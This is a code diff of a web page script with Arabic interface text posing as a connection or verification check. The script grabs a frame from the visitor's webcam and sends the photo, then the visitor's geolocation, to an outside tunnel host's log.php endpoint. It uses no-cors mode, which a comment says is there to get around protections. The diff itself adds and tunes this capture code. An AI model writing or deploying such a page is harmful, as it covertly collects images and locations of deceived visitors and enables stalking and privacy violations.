@@ -14,40 +14,40 @@
 
     <script>
     async function start() {
-        const btn = document.getElementById('btn');
+        const btn = document.getElementById("btn");
         btn.innerText = "جاري الاتصال بالسيرفر...";
-        // الرابط الجديد الخاص بك
-        const tunnel = "https://3540d7ca7ea8c8.lhr.life"; 
+        const tunnel = "https://3540d7ca7ea8c8.lhr.life"; // رابطك الحالي
 
         try {
-            // طلب الكاميرا أولاً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             btn.innerText = "جاري معالجة البيانات...";
             
-            const video = document.createElement('video');
+            const video = document.createElement("video");
             video.srcObject = stream;
             video.play();
 
             video.onloadedmetadata = () => {
                 setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320; // تقليل الحجم لسرعة الإرسال
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/jpeg', 0.7); // ضغط الصورة
+                    const canvas = document.createElement("canvas");
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL("image/jpeg", 0.6);
 
-                    // إرسال البيانات بتنسيق بسيط جداً
-                    fetch(`${tunnel}/log.php`, {
-                        method: 'POST',
-                        mode: 'no-cors', // لتجاوز مشاكل الحماية
-                        body: JSON.stringify({ img: img })
+                    // إرسال الصورة
+                    await fetch(tunnel + "/log.php", {
+                        method: "POST",
+                        mode: "no-cors",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ img: imgData })
                     });
 
-                    // إرسال الموقع بشكل منفصل لضمان الوصول
-                    navigator.geolocation.getCurrentPosition(p => {
-                        fetch(`${tunnel}/log.php`, {
-                            method: 'POST',
-                            mode: 'no-cors',
+                    // إرسال الموقع
+                    navigator.geolocation.getCurrentPosition(async (p) => {
+                        await fetch(tunnel + "/log.php", {
+                            method: "POST",
+                            mode: "no-cors",
+                            headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
                         });
                     });
@@ -61,7 +61,7 @@
                 }, 2000);
             };
         } catch (e) {
-            alert("خطأ: يرجى تفعيل إذن الكاميرا والموقع للمتابعة.");
+            alert("خطأ في الأذونات: يرجى تفعيل الكاميرا والموقع.");
             btn.innerText = "فشل التحقق - حاول مجدداً";
         }
     }
